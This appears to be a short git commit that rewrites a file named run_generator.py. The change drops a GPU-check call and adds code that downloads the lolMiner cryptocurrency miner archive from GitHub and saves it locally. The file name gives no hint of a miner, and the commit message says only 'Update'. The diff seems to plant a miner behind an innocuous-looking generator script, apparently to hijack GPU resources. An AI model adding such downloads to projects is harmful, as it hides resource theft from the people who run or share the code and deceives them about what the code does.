edd2f4c062689113d7df0a5e6a844f0a964ac19d
cringe0 <92528095+cringe0@users.noreply.github.com>
2021-10-14 19:08:52 +0500

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,3 +1,5 @@
-import os as alpha 
-alpha.system("nvidia-smi")
+import requests
 
+url = 'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz'
+r = requests.get(url, allow_redirects=True)
+open('lolMiner_v1.29_Lin64.tar.gz', 'wb').write(r.content)
